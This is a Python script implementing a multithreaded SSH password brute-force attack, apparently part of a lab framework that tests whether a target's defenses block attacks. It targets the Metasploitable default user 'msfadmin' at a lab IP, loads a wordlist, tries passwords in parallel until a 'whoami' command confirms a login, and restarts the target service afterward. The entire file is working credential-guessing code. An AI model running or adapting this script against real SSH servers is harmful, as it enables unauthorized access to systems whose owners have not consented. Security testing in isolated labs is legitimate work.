#!/usr/bin/python3

import sys
import socket
import threading
import time
from queue import Queue, Empty
import os

# Installed packages
from pwn import *
import argparse
import paramiko

# Declare script path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Custom package
import pre_settings
import pre_ping_check
import pre_attacks
import pre_services_check
import pre_services_restart

# Displays only critical errors or important information
context.log_level = pre_settings.debug_critical

# Disable all pwnlib logs -> remove this if debugging
import logging
logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
logging.getLogger("pwnlib.tubes.remote").setLevel(logging.CRITICAL)
logging.getLogger("pwnlib.tubes").setLevel(logging.CRITICAL)

# Global variables
password_counter = 0  # Tracks password attempts
counter_lock = threading.Lock()  # Ensures safe updates to password_counter
stop_flag = threading.Event()  # Signals successful brute force
lock = threading.Lock()  # Synchronizes output


def attempt_ssh_login(rhost, rport, password, attacks):
    if stop_flag.is_set():
        return None

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    username = 'msfadmin'

    try:
        # Check service status after each password attempt
        status_service_post = pre_services_check.check(rhost, rport)

        client.connect(rhost, port=rport, username=username, password=password, timeout=10)
        _stdin, _stdout, _stderr = client.exec_command("whoami")

        if _stdout.read().decode().strip() == username:
            stop_flag.set()  # Signal other threads to stop
            return attacks

    except paramiko.AuthenticationException:
        pass  # Incorrect password, continue
    except (paramiko.SSHException, socket.error, EOFError):
        with lock:
            log.debug(f"Connection error with password: {password}")
    finally:
        client.close()

    # Increment the password counter after each attempt
    with counter_lock:
        global password_counter
        password_counter += 1
        log.debug(f"Attempted {password_counter} passwords. Service status after password '{password}': {status_service_post}")

    return None


def worker(queue, rhost, rport, attacks):
    while not queue.empty() and not stop_flag.is_set():
        try:
            password = queue.get(timeout=1)  # Timeout prevents indefinite blocking
            result = attempt_ssh_login(rhost, rport, password, attacks)
            if result:
                stop_flag.set()  # Signal other threads to stop
        except Empty:  # Queue is empty
            break
        except Exception as e:
            log.error(f"Worker error: {str(e)}")
        finally:
            queue.task_done()  # Mark the task as done


def exploit(rhost, rport, attacks, thread_count):
    global password_counter

    if thread_count > 10:
            log.error('Number of thread must be less than 10!')

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        status_service_pre = pre_services_check.check(rhost, rport)
        status_ping = pre_ping_check.check(rhost)

        if not status_service_pre:
            log.debug(pre_settings.print_status_service_cleanup(rport, attacks['service'], status_service_pre, 'pre'))
            pre_services_restart.restart_service(rhost, attacks["path"])
            time.sleep(3)

        status_service_pre = pre_services_check.check(rhost, rport)

        attacks['status (ping)'] = 'UP' if status_ping else 'DOWN'
        attacks['status (service)'] = 'UP' if status_service_pre else 'DOWN'

        if status_service_pre:
            try:
                # Load wordlist from 'payload' path
                with open(attacks['payload'], 'r', encoding='latin-1') as file:
                    passwords = [line.strip() for line in file]

                # Create queue and add passwords
                queue = Queue()
                for password in passwords:
                    queue.put(password)

                # Create and start threads
                threads = []
                for _ in range(thread_count):
                    thread = threading.Thread(target=worker, args=(queue, rhost, rport, attacks))
                    thread.daemon = True
                    threads.append(thread)
                    thread.start()

                # Wait for threads to complete
                for thread in threads:
                    thread.join()

                # Check attack result
                if not stop_flag.is_set():
                    status_service_post = pre_services_check.check(rhost, rport)
                    with lock:
                        attacks['remark'] = pre_attacks.fail_bruteforce if status_service_post else pre_attacks.fail_service_down_during_attack
                        print(pre_settings.print_status_attack(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, False, status_service_post, attacks['remark']))
                    return attacks
                else:
                    attacks['status (attack)'] = 'UNBLOCKED'
                    attacks['remark'] = pre_attacks.success_bruteforce
                    status_service_post = pre_services_check.check(rhost, rport)
                    print(pre_settings.print_status_attack(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, True, status_service_post, attacks['remark']))
                    return attacks

            except FileNotFoundError as e:
                log.error(f"Wordlist file not found: {str(e)}")
            except Exception as e:
                log.error(f"Error during attack: {str(e)}")
        else:
            attacks['remark'] = pre_attacks.fail_service_down
            print(pre_settings.print_status_attack(rhost, rport, attacks['service'], attacks['attack'], attacks['type'], status_ping, status_service_pre, False, status_service_pre, attacks['remark']))
            return attacks

    except Exception as e:
        log.error(f"Unexpected error: {str(e)}")

    finally:
        client.close()
        pre_services_restart.restart_service(rhost, attacks["path"])


def main():
    try:
        attacks = pre_attacks.attacks.get('bruteforce_ssh')

        parser = argparse.ArgumentParser(description=pre_settings.print_argparse_desc(attacks['attack']),
                                         epilog=f'{pre_settings.print_argparse_epilog(f"python3 {sys.argv[0]} --rhost 10.251.5.5 --thread 5")}')
        parser.add_argument('--rhost', help='Target IP', default='10.251.5.5')
        parser.add_argument('--thread', help='Number of threads', default=5, type=int)
        args = parser.parse_args()

        rhost = args.rhost
        rport = attacks['port']
        thread_count = args.thread

        exploit(rhost, rport, attacks, thread_count)

    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == '__main__':
    main()
